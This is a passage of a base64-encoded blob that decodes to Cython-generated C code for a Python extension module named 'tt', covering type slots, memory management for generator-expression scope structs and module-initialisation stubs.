BlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByLCBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcikpKSlcbiAge1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVsaXN0XzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByW19fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcisrXSA9ICgoc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciAqKW8pO1xuICB9IGVsc2VcbiAgI2VuZGlmXG4gIHtcbiAgICBQeVR5cGVPYmplY3QgKnRwID0gUHlfVFlQRShvKTtcbiAgICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG4gICAgKCp0cC0+dHBfZnJlZSkobyk7XG4gICAgI2Vsc2VcbiAgICB7XG4gICAgICBmcmVlZnVuYyB0cF9mcmVlID0gKGZyZWVmdW5jKVB5VHlwZV9HZXRTbG90KHRwLCBQeV90cF9mcmVlKTtcbiAgICAgIGlmICh0cF9mcmVlKSB0cF9mcmVlKG8pO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gICAgUHlfREVDUkVGKHRwKTtcbiAgICAjZW5kaWZcbiAgfVxufVxuXG5zdGF0aWMgaW50IF9fcHl4X3RwX3RyYXZlcnNlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKFB5T2JqZWN0ICpvLCB2aXNpdHByb2Mgdiwgdm9pZCAqYSkge1xuICBpbnQgZTtcbiAgc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciAqcCA9IChzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByICopbztcbiAge1xuICAgIGUgPSBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UobywgMSwgdiwgYSk7XG4gICAgaWYgKGUpIHJldHVybiBlO1xuICB9XG4gIGlmIChwLT5fX3B5eF9vdXRlcl9zY29wZSkge1xuICAgIGUgPSAoKnYpKCgoUHlPYmplY3QgKilwLT5fX3B5eF9vdXRlcl9zY29wZSksIGEpOyBpZiAoZSkgcmV0dXJuIGU7XG4gIH1cbiAgaWYgKHAtPl9fcHl4X2dlbmV4cHJfYXJnXzApIHtcbiAgICBlID0gKCp2KShwLT5fX3B5eF9nZW5leHByX2FyZ18wLCBhKTsgaWYgKGUpIHJldHVybiBlO1xuICB9XG4gIGlmIChwLT5fX3B5eF92X2kpIHtcbiAgICBlID0gKCp2KShwLT5fX3B5eF92X2ksIGEpOyBpZiAoZSkgcmV0dXJuIGU7XG4gIH1cbiAgcmV0dXJuIDA7XG59XG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG5zdGF0aWMgUHlUeXBlX1Nsb3QgX19weXhfdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcl9zbG90c1tdID0ge1xuICB7UHlfdHBfZGVhbGxvYywgKHZvaWQgKilfX3B5eF90cF9kZWFsbG9jXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByfSxcbiAge1B5X3RwX3RyYXZlcnNlLCAodm9pZCAqKV9fcHl4X3RwX3RyYXZlcnNlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByfSxcbiAge1B5X3RwX25ldywgKHZvaWQgKilfX3B5eF90cF9uZXdfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJ9LFxuICB7MCwgMH0sXG59O1xuc3RhdGljIFB5VHlwZV9TcGVjIF9fcHl4X3R5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJfc3BlYyA9IHtcbiAgInR0Ll9fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIiLFxuICBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciksXG4gIDAsXG4gIFB5X1RQRkxBR1NfREVGQVVMVHxQeV9UUEZMQUdTX0hBVkVfVkVSU0lPTl9UQUd8UHlfVFBGTEFHU19DSEVDS1RZUEVTfFB5X1RQRkxBR1NfSEFWRV9ORVdCVUZGRVJ8UHlfVFBGTEFHU19IQVZFX0dDLFxuICBfX3B5eF90eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByX3Nsb3RzLFxufTtcbiNlbHNlXG5cbnN0YXRpYyBQeVR5cGVPYmplY3QgX19weXhfdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciA9IHtcbiAgUHlWYXJPYmplY3RfSEVBRF9JTklUKDAsIDApXG4gICJ0dC4iIl9fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIiLCBcbiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpLCBcbiAgMCwgXG4gIF9fcHl4X3RwX2RlYWxsb2NfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIFB5X1RQRkxBR1NfREVGQVVMVHxQeV9UUEZMQUdTX0hBVkVfVkVSU0lPTl9UQUd8UHlfVFBGTEFHU19DSEVDS1RZUEVTfFB5X1RQRkxBR1NfSEFWRV9ORVdCVUZGRVJ8UHlfVFBGTEFHU19IQVZFX0dDLCBcbiAgMCwgXG4gIF9fcHl4X3RwX3RyYXZlcnNlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbiAgMCwgXG4gICNlbmRpZlxuICAwLCBcbiAgMCwgXG4gIF9fcHl4X3RwX25ld18ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gIDAsIFxuICAjZWxzZVxuICBOVUxMLCBcbiAgI2VuZGlmXG4gICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IFBZUFlfVkVSU0lPTl9OVU0gPj0gMHgwNzAzMDgwMFxuICAwLCBcbiAgI2VuZGlmXG4gICNpZiBfX1BZWF9ORUVEX1RQX1BSSU5UX1NMT1QgPT0gMVxuICAwLCBcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwXG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTRcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGEwMDAwXG4gIDAsIFxuICAjZW5kaWZcbn07XG4jZW5kaWZcblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF90cF9uZXdfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIoUHlUeXBlT2JqZWN0ICp0LCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICphLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICprKSB7XG4gIFB5T2JqZWN0ICpvO1xuICAjaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFNcbiAgaWYgKGxpa2VseSgoaW50KShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIgPiAwKSAmIF9fUFlYX0NIRUNLX0ZJTkFMX1RZUEVfRk9SX0ZSRUVMSVNUUyh0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9wdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwciwgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIpKSkpXG4gIHtcbiAgICBvID0gKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlbGlzdF8ydHRfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwclstLV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8ydHRfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcl07XG4gICAgI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICAgIFB5X0RFQ1JFRihQeV9UWVBFKG8pKTtcbiAgICAjZW5kaWZcbiAgICBtZW1zZXQobywgMCwgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIpKTtcbiAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgICh2b2lkKSBQeU9iamVjdF9Jbml0KG8sIHQpO1xuICAgICNlbHNlXG4gICAgKHZvaWQpIFB5T2JqZWN0X0lOSVQobywgdCk7XG4gICAgI2VuZGlmXG4gICAgUHlPYmplY3RfR0NfVHJhY2sobyk7XG4gIH0gZWxzZVxuICAjZW5kaWZcbiAge1xuICAgIG8gPSBfX1B5eF9BbGxvY2F0ZUV4dGVuc2lvblR5cGUodCwgMSk7XG4gICAgaWYgKHVubGlrZWx5KCFvKSkgcmV0dXJuIDA7XG4gIH1cbiAgcmV0dXJuIG87XG59XG5cbnN0YXRpYyB2b2lkIF9fcHl4X3RwX2RlYWxsb2NfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIoUHlPYmplY3QgKm8pIHtcbiAgc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwciAqcCA9IChzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByICopbztcbiAgI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbiAgaWYgKHVubGlrZWx5KF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZmluYWxpemUsIGRlc3RydWN0b3IpKSAmJiAhX19QeXhfUHlPYmplY3RfR0NfSXNGaW5hbGl6ZWQobykpIHtcbiAgICBpZiAoX19QeXhfUHlPYmplY3RfR2V0U2xvdChvLCB0cF9kZWFsbG9jLCBkZXN0cnVjdG9yKSA9PSBfX3B5eF90cF9kZWFsbG9jXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByKSB7XG4gICAgICBpZiAoUHlPYmplY3RfQ2FsbEZpbmFsaXplckZyb21EZWFsbG9jKG8pKSByZXR1cm47XG4gICAgfVxuICB9XG4gICNlbmRpZlxuICBQeU9iamVjdF9HQ19VblRyYWNrKG8pO1xuICBQeV9DTEVBUihwLT5fX3B5eF9nZW5leHByX2FyZ18wKTtcbiAgUHlfQ0xFQVIocC0+X19weXhfdl9mdXR1cmUpO1xuICBQeV9DTEVBUihwLT5fX3B5eF90XzApO1xuICAjaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFNcbiAgaWYgKGxpa2VseSgoaW50KShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIgPCA4KSAmIF9fUFlYX0NIRUNLX0ZJTkFMX1RZUEVfRk9SX0ZSRUVMSVNUUyhQeV9UWVBFKG8pLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9wdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwciwgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIpKSkpXG4gIHtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlbGlzdF8ydHRfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcltfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIrK10gPSAoKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIgKilvKTtcbiAgfSBlbHNlXG4gICNlbmRpZlxuICB7XG4gICAgUHlUeXBlT2JqZWN0ICp0cCA9IFB5X1RZUEUobyk7XG4gICAgI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAgICgqdHAtPnRwX2ZyZWUpKG8pO1xuICAgICNlbHNlXG4gICAge1xuICAgICAgZnJlZWZ1bmMgdHBfZnJlZSA9IChmcmVlZnVuYylQeVR5cGVfR2V0U2xvdCh0cCwgUHlfdHBfZnJlZSk7XG4gICAgICBpZiAodHBfZnJlZSkgdHBfZnJlZShvKTtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAgI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICAgIFB5X0RFQ1JFRih0cCk7XG4gICAgI2VuZGlmXG4gIH1cbn1cblxuc3RhdGljIGludCBfX3B5eF90cF90cmF2ZXJzZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcihQeU9iamVjdCAqbywgdmlzaXRwcm9jIHYsIHZvaWQgKmEpIHtcbiAgaW50IGU7XG4gIHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIgKnAgPSAoc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwciAqKW87XG4gIHtcbiAgICBlID0gX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKG8sIDEsIHYsIGEpO1xuICAgIGlmIChlKSByZXR1cm4gZTtcbiAgfVxuICBpZiAocC0+X19weXhfZ2VuZXhwcl9hcmdfMCkge1xuICAgIGUgPSAoKnYpKHAtPl9fcHl4X2dlbmV4cHJfYXJnXzAsIGEpOyBpZiAoZSkgcmV0dXJuIGU7XG4gIH1cbiAgaWYgKHAtPl9fcHl4X3ZfZnV0dXJlKSB7XG4gICAgZSA9ICgqdikocC0+X19weXhfdl9mdXR1cmUsIGEpOyBpZiAoZSkgcmV0dXJuIGU7XG4gIH1cbiAgaWYgKHAtPl9fcHl4X3RfMCkge1xuICAgIGUgPSAoKnYpKHAtPl9fcHl4X3RfMCwgYSk7IGlmIChlKSByZXR1cm4gZTtcbiAgfVxuICByZXR1cm4gMDtcbn1cbiNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbnN0YXRpYyBQeVR5cGVfU2xvdCBfX3B5eF90eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByX3Nsb3RzW10gPSB7XG4gIHtQeV90cF9kZWFsbG9jLCAodm9pZCAqKV9fcHl4X3RwX2RlYWxsb2NfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHJ9LFxuICB7UHlfdHBfdHJhdmVyc2UsICh2b2lkICopX19weXhfdHBfdHJhdmVyc2VfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHJ9LFxuICB7UHlfdHBfbmV3LCAodm9pZCAqKV9fcHl4X3RwX25ld18ydHRfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcn0sXG4gIHswLCAwfSxcbn07XG5zdGF0aWMgUHlUeXBlX1NwZWMgX19weXhfdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcl9zcGVjID0ge1xuICAidHQuX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwciIsXG4gIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByKSxcbiAgMCxcbiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfR0MsXG4gIF9fcHl4X3R5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHJfc2xvdHMsXG59O1xuI2Vsc2Vcblxuc3RhdGljIFB5VHlwZU9iamVjdCBfX3B5eF90eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByID0ge1xuICBQeVZhck9iamVjdF9IRUFEX0lOSVQoMCwgMClcbiAgInR0LiIiX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwciIsIFxuICBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwciksIFxuICAwLCBcbiAgX19weXhfdHBfZGVhbGxvY18ydHRfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwciwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfR0MsIFxuICAwLCBcbiAgX19weXhfdHBfdHJhdmVyc2VfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAjaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICAwLCBcbiAgI2VuZGlmXG4gIDAsIFxuICAwLCBcbiAgX19weXhfdHBfbmV3XzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbiAgMCwgXG4gICNlbHNlXG4gIE5VTEwsIFxuICAjZW5kaWZcbiAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgUFlQWV9WRVJTSU9OX05VTSA+PSAweDA3MDMwODAwXG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIF9fUFlYX05FRURfVFBfUFJJTlRfU0xPVCA9PSAxXG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDBcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBBNFxuICAwLCBcbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMCAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwYTAwMDBcbiAgMCwgXG4gICNlbmRpZlxufTtcbiNlbmRpZlxuXG5zdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWV0aG9kc1tdID0ge1xuICB7MCwgMCwgMCwgMH1cbn07XG5cbnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfSW5pdENhY2hlZEJ1aWx0aW5zKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IFxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9Jbml0Q2FjaGVkQ29uc3RhbnRzKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IFxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9Jbml0R2xvYmFscyh2b2lkKTsgXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X0luaXRDb25zdGFudHMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X21vZGluaXRfZ2xvYmFsX2luaXRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyBcbnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfbW9kaW5pdF92YXJpYWJsZV9leHBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyBcbnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9leHBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyBcbnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfbW9kaW5pdF90eXBlX2luaXRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyBcbnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfbW9kaW5pdF90eXBlX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IFxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IFxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9tb2Rpbml0X2Z1bmN0aW9uX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IFxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9DcmVhdGVDb2RlT2JqZWN0cyhfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyBcblxuXG5zdGF0aWMgaW50IF9fUHl4X21vZGluaXRfZ2xvYmFsX2luaXRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfZ2xvYmFsX2luaXRfY29kZSIsIDApO1xuICBcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiAwO1xufVxuXG5zdGF0aWMgaW50IF9fUHl4X21vZGluaXRfdmFyaWFibGVfZXhwb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2V4cG9ydF9jb2RlIiwgMCk7XG4gIFxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIDA7XG59XG5cbnN0YXRpYyBpbnQgX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9leHBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfZnVuY3Rpb25fZXhwb3J0X2NvZGUiLCAwKTtcbiAgXG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gMDtcbn1cblxuc3RhdGljIGludCBfX1B5eF9tb2Rpbml0X3R5cGVfaW5pdF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkge1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpO1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9tb2Rpbml0X3R5cGVfaW5pdF9jb2RlIiwgMCk7XG4gIFxuICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsID0gKFB5VHlwZU9iamVjdCAqKSBfX1B5eF9QeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMoX19weXhfbSwgJl9fcHl4X3R5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsX3NwZWMsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsKSkgX19QWVhfRVJSKDAsIDgyLCBfX3B5eF9MMV9lcnJvcilcbiAgaWYgKF9fUHl4X2ZpeF91cF9leHRlbnNpb25fdHlwZV9mcm9tX3NwZWMoJl9fcHl4X3R5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsX3NwZWMsIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsKSA8ICgwKSkgX19QWVhfRVJSKDAsIDgyLCBfX3B5eF9MMV9lcnJvcilcbiAgI2Vsc2VcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0X190bGwgPSAmX19weXhfdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0X190bGw7XG4gICNlbmRpZlxuICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgI2VuZGlmXG4gICNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gIGlmIChfX1B5eF9QeVR5cGVfUmVhZHkoX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0X190bGwpIDwgKDApKSBfX1BZWF9FUlIoMCwgODIsIF9fcHl4X0wxX2Vycm9yKVxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEUwMDAwXG4gIFB5VW5zdGFibGVfT2JqZWN0X0VuYWJsZURlZmVycmVkUmVmY291bnQoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCk7XG4gICNlbmRpZlxuICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgaWYgKChDWVRIT05fVVNFX1RZUEVfU0xPVFMgJiYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQKSAmJiBsaWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsLT50cF9kaWN0b2Zmc2V0ICYmIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsLT50cF9nZXRhdHRybyA9PSBQeU9iamVjd